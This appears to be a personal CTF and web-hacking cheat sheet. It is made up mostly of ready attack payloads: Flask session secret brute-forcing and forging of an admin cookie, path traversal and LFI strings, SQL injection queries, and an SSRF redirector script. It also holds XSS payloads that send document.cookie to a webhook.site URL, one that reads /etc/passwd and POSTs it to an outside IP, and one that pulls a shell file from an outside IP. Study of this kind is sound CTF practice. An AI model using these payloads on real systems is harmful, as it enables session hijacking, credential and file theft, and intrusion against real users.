#### JWT-Tokens:
https://jwt.io/
https://github.com/Paradoxis/Flask-Unsign 

```shell
$ flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6ImlvIn0.Y7K3hg.H8hfeerAjxxCjOU9zvIdCPUH1Uo'

[*] Session decodes to: {'username': 'io'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----.m2
[*] Attempted (2560): /-W%/gister your app with Twi
[*] Attempted (4480): 5#y2LF4Q8zd2029436f75c77961a8*
[*] Attempted (25088): -----BEGIN PRIVATE KEY-----d98
[+] Found secret key after 35712 attemptseveloper Pre
'This is an UNSECURE Secret. CHANGE THIS for production environments.'

$ flask-unsign --sign --cookie "{'username': 'admin'}" --secret 'This is an UNSECURE Secret. CHANGE THIS for production environments.'

eyJ1c2VybmFtZSI6ImFkbWluIn0.Y7M8Eg.37vJZ3ku6MkHGfcShVXQElTzSmE
```


#### Path-Traversal
Try 
```
../
..%2f
..%2f..%2f
```
https://github.com/omurugur/Path_Travelsal_Payload_List/blob/master/Payload/Deep-Travelsal.txt

#### Tips
Look for cookies 
/Console


#### Log4J
JNDI-Server, download and make
https://github.com/mbechler/marshalsec 

![[23_01_08_65gft.png]]


### Parameters in Requests python
```python
url = "http://localhost:80/" 
params = { 
	"a": "flag", 
	"b": "flag" 
} 
response = requests.get(url, params=params) 
# = http://localhost:80/?a=flag&b=flag 
response = requests.get(url, data=params) 
# = http://localhost:80/ Content-Type: application/x-www-form-urlencoded, body: a=flag&b=flag 
response = requests.get(url, json=params) 
# = http://localhost:80/ Content-Type: application/json, body: {"a":"flag","b":"flag"} 
response = requests.get(url, files={"file": open("file.txt", "r"))}) # = http://localhost:80/ Content-Type: multipart/form-data, body: fil-innhold på multipart/form-format
```


### Make http requests to a website
https://webhook.site

```html
<script>fetch('https://webhook.site/25361894-8e43-4d9d-802b-4499aa474b22').then(response => response.json()).then(json => console.log(json));</script>
```

```html
<script>fetch('https://webhook.site/25361894-8e43-4d9d-802b-4499aa474b22', {method:'POST', body: JSON.stringify({data:document.cookie})});</script>
```
```html
<script>fetch('https://webhook.site/25361894-8e43-4d9d-802b-4499aa474b22/' + document.cookie)</script>
```


## SQL-Injection 
#### XPATH for INSERT-statement
![[sql_injection_insert.pdf]]


Finding table names
```mysql
UNION SELECT table_name FROM information_schema.tables--
```
Finding column names
```mysql
UNION SELECT column_name FROM information_schema.columns--
```




GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.
https://gtfobins.github.io/

### Local File Inclusion
```
file:///flag.txt
file://host/flag.txt
```

### XSS
```html
# upload file
<script>function downloadFile(url, filename) {var xhr = new XMLHttpRequest();xhr.open('GET', url, true);xhr.responseType = 'blob';xhr.onload = function () {if (xhr.status === 200) {var blob = new Blob([xhr.response], { type: 'application/octet-stream' });var link = document.createElement('a');link.href = window.URL.createObjectURL(blob);link.download = filename;link.style.display = 'none';document.body.appendChild(link);link.click();document.body.removeChild(link);}};xhr.send();}downloadFile('http://10.10.14.142:8000/shell.html', 'test');</script>


# RETRIEVE FILE
<script>x = new XMLHttpRequest;x.onload = function () {var encodedContent = btoa(this.responseText);var xhttp = new XMLHttpRequest();xhttp.open('POST', 'http://10.10.14.142:8001/receive_data', true);xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xhttp.send('data=' + encodeURIComponent(encodedContent));};x.open('GET', 'file:///etc/passwd');x.send();</script>
```


### Bypass localhost with a domain redirection
| Domain                       | Redirect to |
| ---------------------------- | ----------- |
| localtest.me                 | `::1`       |
| localh.st                    | `127.0.0.1` |
| spoofed.[BURP_COLLABORATOR]  | `127.0.0.1` |
| spoofed.redacted.oastify.com | `127.0.0.1` |
| company.127.0.0.1.nip.io     | `127.0.0.1` |


### SSRF Redirector
```python
#!/usr/bin/env python3

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("""
Usage: {} <port_number> <url>
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(307)
       self.send_header('Location', sys.argv[2])
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
When someone connects to port 4444, they get redirected to the url
##### Usage
```sh
python3 fuckoff.py 4444 'http://localhost:1337/debug/environment'
```

